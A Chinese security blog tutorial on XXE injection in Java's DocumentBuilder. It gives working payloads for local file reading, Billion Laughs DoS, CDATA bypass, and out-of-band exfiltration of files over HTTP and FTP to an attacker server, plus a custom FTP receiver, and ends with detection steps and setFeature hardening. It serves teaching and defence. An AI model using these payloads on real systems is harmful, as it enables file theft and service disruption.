# XML注入之DocumentBuilder与XXE攻击防御

2019-02-13 / [Java](https://www.mi1k7ea.com/tags/Java/)[Web安全](https://www.mi1k7ea.com/tags/Web安全/)[XML注入](https://www.mi1k7ea.com/tags/XML注入/)

## 0x01 何为DocumentBuilder

DocumentBuilder是Java中常用的XML文档解析工具，是基于 DOM（Document Object Model，文档对象模型）的解析方式，把整个XML文档加载到内存并转化成DOM树，因此应用程序可以随机访问DOM树的任何数据。因此其优点是灵活性强、速度快； 缺点是消耗资源比较多。

## 0x02 常规用法Demo

先定义一个user.xml，用于让DocumentBuilder来解析：

```
<?xml version="1.0" encoding="UTF-8"?>
<user>
    <name>Mi1k7ea</name>
    <sex>male</sex>
    <age>20</age>
</user>
```

解析代码：

```
public class test {
    public static void main(String[] args){
        File f = new File("user.xml");
        documentBuilder(f);
    }

    public static void documentBuilder(File f){
        DocumentBuilderFactory factory=DocumentBuilderFactory.newInstance();
        try {
            DocumentBuilder builder=factory.newDocumentBuilder();
            //解析xml文档，先获取
            Document doc=builder.parse(f);
            //通过user名字来获取dom节点
            NodeList nodeList=doc.getElementsByTagName("user");
            Element e=(Element)nodeList.item(0);
            //获取值
            System.out.println("姓名："+e.getElementsByTagName("name").item(0).getFirstChild().getNodeValue());
            System.out.println("性别："+e.getElementsByTagName("sex").item(0).getFirstChild().getNodeValue());
            System.out.println("年龄："+e.getElementsByTagName("age").item(0).getFirstChild().getNodeValue());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

运行后，发现成功解析了user.xml的内容：

![demo](https://www.mi1k7ea.com/2019/02/13/XML%E6%B3%A8%E5%85%A5%E4%B9%8BDocumentBuilder/1.png)

## 0x03 XML注入漏洞验证

### 1、测试是否支持解析DTD：

创建test.xml，内容如下，主要添加了DTD即DOCTYPE：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo>
<user>
    <name>Mi1k7ea</name>
    <sex>male</sex>
    <age>20</age>
</user>
```

测试代码中将user.xml改为test.xml。

运行代码，效果和Demo一样，即说明支持解析DTD。

这里注意一点，当进行的是黑盒测试时，未返回Error不代表就是可以解析XML，但返回Error就肯定是不支持解析该XML，原因是服务端可能对Error进行了封装。

### 2、测试是否支持解析普通实体：

修改test.xml内容如下，主要添加ELEMENT：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
        <!ELEMENT foo EMPTY>
        ]>
<user>
    <name>Mi1k7ea</name>
    <sex>male</sex>
    <age>20</age>
</user>
```

发现可以正常解析。

### 3、测试是否支持解析参数实体：

修改test.xml内容如下，主要修改ELEMENT为ENTITY实体：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
        <!ENTITY foo "Entity can be hacked">
        ]>
<user>
    <name>Mi1k7ea</name>
    <sex>&foo;</sex>
    <age>20</age>
</user>
```

运行代码，发现可正常解析，且成功进行了XML实体注入：

![demo](https://www.mi1k7ea.com/2019/02/13/XML%E6%B3%A8%E5%85%A5%E4%B9%8BDocumentBuilder/2.png)

### 4、测试是否支持解析外部实体：

修改test.xml内容如下，主要修改为SYSTEM执行访问外部链接：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo SYSTEM "http://192.168.17.136:8000/Mi1k7ea.dtd">
<user>
    <name>Mi1k7ea</name>
    <sex>male</sex>
    <age>&tea;</age>
</user>
```

在攻击者的服务器（这里自己开启一个Web服务）的Web目录放置一个Mi1k7ea.dtd文件，内容如下，读取本地C盘中的win.ini配置文件（若在Linux下读取”file:///etc/passwd”会报错，因为这种攻击方式受到XML中禁止字符的限制）：

```
<!ENTITY tea SYSTEM "file:///c:/windows/win.ini">
```

运行代码，在攻击者服务器看到目标程序访问了其中的恶意DTD文件：

![demo](https://www.mi1k7ea.com/2019/02/13/XML%E6%B3%A8%E5%85%A5%E4%B9%8BDocumentBuilder/3.png)

发现成功通过远程加载解析DTD文件读取了本地文件内容：

![demo](https://www.mi1k7ea.com/2019/02/13/XML%E6%B3%A8%E5%85%A5%E4%B9%8BDocumentBuilder/4.png)

当然，外部实体还有另一种写法，如下：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
        <!ENTITY % milk SYSTEM "http://192.168.17.136:8000/Mi1k7ea.dtd">
        %milk;
        ]>
<user>
    <name>Mi1k7ea</name>
    <sex>male</sex>
    <age>&tea;</age>
</user>
```

运行结果和上面是一样的。

至此，我们知道DocumentBuilder是存在XML注入风险的，并且在未设置有效防御措施的时候可支持解析外部实体，即可进行XML外部实体注入攻击(XXE)。

## 0x04 XXE攻击利用

其实前面的测试过程已经是一些利用方式了，如读取本地敏感文件等，但是前提是该XML注入是有回显的。

这里示例测试一些常用的，其他的更详细的以后遇到再补充吧。

### 1、DoS攻击

在Java中，XXE的DoS攻击只对低版本的JDK有效，而高版本的JDK会进行防御。

#### （2）Billion Laughs 攻击

经典的用于DoS的xml文件样例如下，原理为构造恶意的XML实体文件耗尽可用内存，因为许多XML解析器在解析XML文档时倾向于将它的整个结构保留在内存中：

```
<?xml version="1.0"?>
<!DOCTYPE lolz [
        <!ENTITY lol "lol">
        <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
        <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
        <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
        <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
        <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
        <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
        <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
        <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
        ]>
<lolz>&lol9;</lolz>
```

这个在其他编程语言或者JDK版本较低的Java中可利用，但在高版本JDK的环境中会报错中断解析：

![demo](https://www.mi1k7ea.com/2019/02/13/XML%E6%B3%A8%E5%85%A5%E4%B9%8BDocumentBuilder/6.png)

当然，这种类型的DoS攻击也支持参数实体的方式。将dos.xml修改如下：

```
<!DOCTYPE data SYSTEM "http://192.168.17.136:8000/dos.dtd" [
<!ELEMENT data (#PCDATA)>
]>
<data>&tea;</data>
```

在攻击者服务器放置dos.dtd：

```
<!ENTITY % a0 "dos" >
<!ENTITY % a1 "%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;%a0;">
<!ENTITY % a2 "%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;%a1;">
<!ENTITY % a3 "%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;%a2;">
<!ENTITY % a4 "%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;%a3;">
<!ENTITY tea "%a4;" >
```

自己可更换低版本JDK进行测试，这里就不演示了。

#### （2）支持实体测试

主要是利用普通实体ELEMENT，如果解析过程变的非常缓慢，则表明测试成功，即目标解析器配置不安全可能遭受至少一种DDoS攻击：

```
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;">
]>
<data>&a2;</data>
```

#### （3）XML 二次爆破 DDoS 攻击

```
<!DOCTYPE data [
<!ENTITY a0 "dosdosdosdosdosdos...dos"
]>
<data>&a0;&a0;...&a0;</data>
```

#### （4）一般实体递归

最好不要使用递归：

```
<!DOCTYPE data [
<!ENTITY a "a&b;" >
<!ENTITY b "&a;" >
]>
<data>&a;</data>
```

#### （5）外部一般实体

这种攻击方式是通过申明一个外部一般实体，然后引用位于网上或本地的一个大文件(例如：C:/pagefile.sys 或 /dev/random)。换句话说，就是让解析器解析一个 **巨大的 XML 文件**从而导致DoS。

```
<?xml version='1.0'?>
<!DOCTYPE data [
<!ENTITY dos SYSTEM "file:///publicServer.com/largeFile.xml" >
]>
<data>&dos;</data>
```

### 2、基本XXE攻击

#### 有回显的XXE攻击

这种攻击就是漏洞验证时利用的第3、4步的示例，如：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
        <!ENTITY foo "Entity can be hacked">
        ]>
<user>
    <name>Mi1k7ea</name>
    <sex>&foo;</sex>
    <age>20</age>
</user>
```

但是这种攻击方式是需要一个直接的反馈通道即可以回显数据，并且读取文件受到XML中禁止字符的限制，如 “<” 和 “&”。如果这些被禁止的字符出现在要访问的文件中(如：/etc/fstab)，则 XML 解析器会抛出一个错误并停止解析。

#### 使用 netdoc 的 XXE 攻击

主要将file://换成netdoc:/，如下：

```
<?xml version="1.0"?>
<!DOCTYPE data [
        <!ELEMENT data (#PCDATA)>
        <!ENTITY file SYSTEM "netdoc:/e:/passwd">
        ]>
<user>
    <name>netdoc</name>
    <sex>netdoc</sex>
    <age>&file;</age>
</user>
```

![img](https://www.mi1k7ea.com/2019/02/13/XML%E6%B3%A8%E5%85%A5%E4%B9%8BDocumentBuilder/8.png)

### 3、高级XXE攻击——直接反馈通道

这类攻击为高级的 XXE 攻击，用于绕过对基本的XXE攻击的限制和OOB（外带数据）攻击。

#### 绕过基本 XXE 攻击的限制

在有回显的基础上，将外部实体读取本地文件的部分拆分一下，如下：

bypass.xml

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data [
    <!ELEMENT data (ANY)>
    <!ENTITY % start "<![CDATA[">
    <!ENTITY % goodies SYSTEM "file:///e:/passwd">
    <!ENTITY % end "]]>">
    <!ENTITY % dtd SYSTEM "http://192.168.43.201/xxe/bypass.dtd">
    %dtd;
]>
<user>
    <name>Mi1k7ea</name>
    <sex>male</sex>
    <age>&all;</age>
</user>
```

bypass.dtd

```
<!ENTITY all '%start;%goodies;%end;'>
```

运行即可触发XXE，并在回显中显示泄露的内容：

![img](https://www.mi1k7ea.com/2019/02/13/XML%E6%B3%A8%E5%85%A5%E4%B9%8BDocumentBuilder/7.png)

#### 滥用属性值的 XXE 攻击

bypass2.xml

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data [
        <!ENTITY % remote SYSTEM "http://192.168.43.201/xxe/bypass2.dtd">
        %remote;
        ]>
<data attrib='&internal;'/>
```

bypass2.dtd

```
<!ENTITY % payload SYSTEM "file:///e:/passwd">
<!ENTITY % param1 "<!ENTITY internal '%payload;'>">
%param1;
```

未尝试成功。。。

### 4、高级XXE攻击——外带数据(OOB)通道

即没有回显的XXE情况。

此时先将Demo代码的输出注释掉：

![img](https://www.mi1k7ea.com/2019/02/13/XML%E6%B3%A8%E5%85%A5%E4%B9%8BDocumentBuilder/9.png)

#### XXE OOB 攻击

主要是通过URL参数的形式将数据外带出去。

需要注意，这种方法外带数据遇到特殊字符就会报错，服务端接收不到外带数据！

oob.xml

```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://192.168.43.201/xxe/oob.dtd">
<data>&send;</data>
```

oob.dtd

```
<!ENTITY % file SYSTEM "file:///e:/secret.ini">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://192.168.43.201:8000/?%file;'>">
%all;
```

先外带无特殊字符的文件内容，可以看到通过URL参数的形式外带出来了：

![img](https://www.mi1k7ea.com/2019/02/13/XML%E6%B3%A8%E5%85%A5%E4%B9%8BDocumentBuilder/10.png)

当外带如passwd等含有换行符或尖括号等文件内容时会报错，接收不到数据：

![img](https://www.mi1k7ea.com/2019/02/13/XML%E6%B3%A8%E5%85%A5%E4%B9%8BDocumentBuilder/11.png)

#### XXE OOB 攻击——参数实体

和前者类似，区别仅在于只使用参数实体，即这里的send为参数实体。

oob2.xml

```
<?xml version="1.0"?>
<!DOCTYPE data [
        <!ENTITY % remote SYSTEM "http://192.168.43.201/xxe/oob2.dtd">
        %remote;
        %send;
        ]>
<data>6</data>
```

oob2.dtd

```
<!ENTITY % payload SYSTEM "file:///e:/secret.ini">
<!ENTITY % param1 "<!ENTITY % send SYSTEM 'http://192.168.43.201:8000/?%payload;'>">
%param1;
```

但是本地测试出现问题，没成功：

![img](https://www.mi1k7ea.com/2019/02/13/XML%E6%B3%A8%E5%85%A5%E4%B9%8BDocumentBuilder/12.png)

#### XXE OOB 攻击——参数实体 FTP

最为经典的XXE攻击方式，通过FTP外带数据，攻击者可以读取到任意长度的文件而不受限于只读一行内容。

这里在本地进行测试。

ftp.xml

```
<?xml version="1.0"?>
<!DOCTYPE ANY[
        <!ENTITY % file SYSTEM "file:///e:/passwd">
        <!ENTITY % remote SYSTEM "http://127.0.0.1/xxe/ftp.dtd">
        %remote;
        %all;
        ]>
<root>&send;</root>
```

ftp.dtd

```
<!ENTITY % all "<!ENTITY send SYSTEM 'ftp://127.0.0.1:21/%file;'>">
```

运行可以看到，FTP服务端日志只能接收到一行的内容，因为其默认处理的方式会受到换行符等字符的影响：

![img](https://www.mi1k7ea.com/2019/02/13/XML%E6%B3%A8%E5%85%A5%E4%B9%8BDocumentBuilder/14.png)

**自行编写FTPServer处理字符输出格式**

FtpServer.java

```
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;

public class FtpServer {
    public static void main(String[] args) throws Exception {
        ServerSocket serverSocket = new ServerSocket(21);
        Socket socket = serverSocket.accept();
        BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
        out.println("220 Ftp Server Running!");
        System.out.println(in.readLine());
        out.println("331 User");
        System.out.println(in.readLine());
        out.println("230 Login In");

        String s1 = "";
        String s2 = "";
        while (true){
            String str = in.readLine();
//            System.out.println(str);
            if (str != null && str.trim().toUpperCase().startsWith("EPSV ALL")){
                if (!s1.isEmpty() || !s2.isEmpty()){
                    System.out.println(s1 + s2);
                }
                out.println("221 Bye!");
                out.close();
                in.close();
                break;
            } else if (str != null && str.trim().toUpperCase().startsWith("CWD")){
                if (s1.isEmpty()){
                    s1 = str.substring(4);
                } else {
                    s2 += "/" + str.substring(4);
                }
            } else {
                if (s1.isEmpty()){
                    System.out.println(str);
                } else {
                    System.out.println(s1 + s2);
                    s1 = str;
                    s2 = "";
                }
            }
            out.println("200 OK!");
        }
    }
}
```

再次运行，可以接收到所有文件内容：

![img](https://www.mi1k7ea.com/2019/02/13/XML%E6%B3%A8%E5%85%A5%E4%B9%8BDocumentBuilder/15.png)

## 0x05 检测方法

1、在Java项目中搜索javax.xml.parsers下的DocumentBuilderFactory和DocumentBuilder，排查是否使用了该API解析XML文档内容；

2、若使用了，则进一步排查是否禁用了不安全的操作，具体的是看setFeature()的设置是否存在绕过的可能。

## 0x06 防御方法

正确地设置setFeature()来进行防御，在创建出新的DocumentBuilderFactory实例之后就调用：

```
public static void documentBuilder(File f){
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    try {
        //防御XML注入
        factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
        factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
        factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
        factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);

        DocumentBuilder builder = factory.newDocumentBuilder();
        //解析xml文档，先获取
        Document doc = builder.parse(f);
        //通过user名字来获取dom节点
        NodeList nodeList = doc.getElementsByTagName("user");
        Element e = (Element)nodeList.item(0);
        //获取值
        System.out.println("姓名："+e.getElementsByTagName("name").item(0).getFirstChild().getNodeValue());
        System.out.println("性别："+e.getElementsByTagName("sex").item(0).getFirstChild().getNodeValue());
        System.out.println("年龄："+e.getElementsByTagName("age").item(0).getFirstChild().getNodeValue());
    } catch (Exception e) {
        e.printStackTrace();
    }
}
```

再次测试之前的payload，都没有成功：

![demo](https://www.mi1k7ea.com/2019/02/13/XML%E6%B3%A8%E5%85%A5%E4%B9%8BDocumentBuilder/5.png)

至于setFeature()的详细配置可查阅：http://xerces.apache.org/xerces2-j/features.html

## 0x07 参考

[DTD/XXE 攻击笔记分享](https://www.freebuf.com/articles/web/97833.html)

[XML外部实体（XXE）注入详解](https://www.cnblogs.com/backlion/p/9302528.html)